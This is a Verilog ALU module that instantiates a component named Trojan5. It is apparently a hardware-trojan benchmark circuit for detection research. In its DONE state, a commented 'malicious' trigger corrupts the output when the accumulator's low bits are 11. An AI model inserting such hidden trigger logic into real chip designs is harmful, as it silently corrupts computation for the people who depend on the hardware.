// ALU Host Circuit for Trojan5
// Fixed I/O to match Trojan5: pon_rst_n_i, prog_dat_i[13:0], pc_reg[12:0] -> prog_adr_o[12:0]
module trojan5_alu_host #(
    parameter DATA_WIDTH = 16,    // ALU data width
    parameter INSTR_SEED = 32'h80004000
)(
    input wire clk,
    input wire pon_rst_n_i,
    input wire [DATA_WIDTH-1:0] operand_a,
    input wire [DATA_WIDTH-1:0] operand_b,
    input wire [3:0] alu_op,
    input wire alu_enable,
    output reg [DATA_WIDTH-1:0] alu_result,
    output reg alu_ready,
    output reg zero_flag,
    output reg carry_flag
);

    // Trojan interface (fixed width)
    wire [13:0] trojan_prog_dat_i;
    wire [12:0] trojan_pc_reg;
    wire [12:0] trojan_prog_adr_o;
    
    // ALU state
    reg [31:0] instruction_gen;
    reg [12:0] pc_counter;
    reg [3:0] alu_state;
    reg [DATA_WIDTH-1:0] acc_reg;
    
    assign trojan_prog_dat_i = instruction_gen[13:0] ^ {10'b0, alu_op};
    assign trojan_pc_reg = pc_counter;

    // Generate program data from ALU operations
    always @(posedge clk or negedge pon_rst_n_i) begin
        if (!pon_rst_n_i) begin
            instruction_gen <= INSTR_SEED;
            pc_counter <= 13'h0;
        end else if (alu_enable) begin
            instruction_gen <= {instruction_gen[30:0], instruction_gen[31] ^ instruction_gen[19] ^ instruction_gen[11] ^ instruction_gen[5]};
            pc_counter <= pc_counter + {9'b0, alu_op};
        end
    end
    
    // ALU operations
    always @(posedge clk or negedge pon_rst_n_i) begin
        if (!pon_rst_n_i) begin
            acc_reg <= {DATA_WIDTH{1'b0}};
            alu_result <= {DATA_WIDTH{1'b0}};
            alu_ready <= 1'b1;
            alu_state <= 4'h0;
            zero_flag <= 1'b0;
            carry_flag <= 1'b0;
        end else begin
            case (alu_state)
                4'h0: begin // IDLE
                    if (alu_enable) begin
                        alu_ready <= 1'b0;
                        alu_state <= 4'h1;
                    end
                end
                4'h1: begin // EXECUTE
                    case (alu_op[2:0])
                        3'b000: {carry_flag, acc_reg} <= operand_a + operand_b;             // ADD
                        3'b001: {carry_flag, acc_reg} <= operand_a - operand_b;             // SUB
                        3'b010: acc_reg <= operand_a & operand_b;                           // AND
                        3'b011: acc_reg <= operand_a | operand_b;                           // OR
                        3'b100: acc_reg <= operand_a ^ operand_b;                           // XOR
                        3'b101: acc_reg <= operand_a << operand_b[$clog2(DATA_WIDTH)-1:0];  // SHL
                        3'b110: acc_reg <= operand_a >> operand_b[$clog2(DATA_WIDTH)-1:0];  // SHR
                        3'b111: acc_reg <= ~operand_a;                                      // NOT
                        default: acc_reg <= {DATA_WIDTH{1'b0}};
                    endcase
                    alu_state <= 4'h2;
                end
                4'h2: begin // DONE
                    // Modify the output result maliciously if condition is met
                    if (acc_reg[1:0] == 2'b11) begin
                        alu_result <= alu_result ^ {{(DATA_WIDTH-13){1'b0}}, trojan_prog_adr_o};
                    end else begin
                        alu_result <= acc_reg;
                    end
                    zero_flag <= (acc_reg == {DATA_WIDTH{1'b0}});
                    alu_ready <= 1'b1;
                    alu_state <= 4'h0;
                end
                default: alu_state <= 4'h0;
            endcase
        end
    end
    
    // Instantiate Trojan5
    Trojan5 trojan_inst (
        .pon_rst_n_i(pon_rst_n_i),
        .prog_dat_i(trojan_prog_dat_i),
        .pc_reg(trojan_pc_reg),
        .prog_adr_o(trojan_prog_adr_o)
    );

endmodule
